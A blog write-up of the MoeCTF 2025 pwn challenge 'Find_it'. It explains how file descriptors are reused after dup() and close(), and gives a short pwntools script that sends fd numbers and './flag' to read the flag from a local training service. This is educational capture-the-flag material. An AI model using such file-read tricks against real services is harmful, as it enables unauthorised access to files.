---
title: 'XiDianCTF MoeCTF 2025 PWN 1 Find_it'
date: '2026-09-02T16:42:29+08:00'
lastmod: '2026-09-02T16:42:29+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=919)

As usual, open the binary in IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char file[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = dup(1);
  write(v3, "I've hidden the fd of stdout. Can you find it?\n", 0x2FuLL);
  close(1);
  __isoc99_scanf("%d", &fd1);
  write(fd1, "You are right.What would you like to see?\n", 0x2AuLL);
  __isoc99_scanf("%s%*c", file);
  open(file, 0);
  write(fd1, "What is its fd?\n", 0x10uLL);
  __isoc99_scanf("%d", &fd2);
  read(fd2, &buf, 0x50uLL);
  write(fd1, &buf, 0x50uLL);
  return 0;
}
```



> An fd (file descriptor) is a non-negative integer that a process uses to refer to an open file or another I/O object on Unix and Unix-like systems.[^fd]
>
> `dup(int oldfd)` creates a new file descriptor that shares its file offset with the original descriptor.[^dup]
>
> By default:
> 0 stdin
> 1 stdout
> 2 stderr
>
> When a new fd is allocated, the lowest available non-negative integer is used.

Notice that:

```c

  v3 = dup(1);
  // 3 is the lowest available descriptor, so v3 = 3
  write(v3, "I've hidden the fd of stdout. Can you find it?\n", 0x2FuLL);
  close(1); // release fd 1

  // fd 3 now points to stdout
  __isoc99_scanf("%d", &fd1);
  write(fd1, "You are right.What would you like to see?\n", 0x2AuLL);

  __isoc99_scanf("%s%*c", file);
  open(file, 0);
  write(fd1, "What is its fd?\n", 0x10uLL);
  // 1 is now the lowest available descriptor, so fd2 = 1
  __isoc99_scanf("%d", &fd2);
  read(fd2, &buf, 0x50uLL);
  write(fd1, &buf, 0x50uLL);
 
```



The script is as follows:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 47287)

io.sendline(b'3')
io.sendline(b'./flag')
io.sendline(b'1')

io.interactive()
```

Output:

```
[x] Opening connection to 127.0.0.1 on port 47287
[x] Opening connection to 127.0.0.1 on port 47287: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 47287: Done
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x7 bytes:
    b'./flag\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[*] Switching to interactive mode
[DEBUG] Received 0x2f bytes:
    b"I've hidden the fd of stdout. Can you find it?\n"
I've hidden the fd of stdout. Can you find it?
[DEBUG] Received 0x8a bytes:
    00000000  59 6f 75 20  61 72 65 20  72 69 67 68  74 2e 57 68  │You │are │righ│t.Wh│
    00000010  61 74 20 77  6f 75 6c 64  20 79 6f 75  20 6c 69 6b  │at w│ould│ you│ lik│
    00000020  65 20 74 6f  20 73 65 65  3f 0a 57 68  61 74 20 69  │e to│ see│?·Wh│at i│
    00000030  73 20 69 74  73 20 66 64  3f 0a 6d 6f  65 63 74 66  │s it│s fd│?·mo│ectf│
    00000040  7b -- -- --  -- -- -- --  -- -- -- --  -- -- -- --  │{---│----│----│----│
    00000050  -- -- -- --  -- -- -- --  -- -- -- --  -- -- 7d 0a  │----│----│----│--}·│
    00000060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000080  00 00 00 00  00 00 00 00  00 00                     │····│····│··│
    0000008a
You are right.What would you like to see?
What is its fd?
moectf{THIS_IS_FLAG}
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 47287
```



[^fd]:[File descriptor](https://en.wikipedia.org/wiki/File_descriptor)
[^dup]:[dup (system call)](https://en.wikipedia.org/wiki/Dup_(system_call))

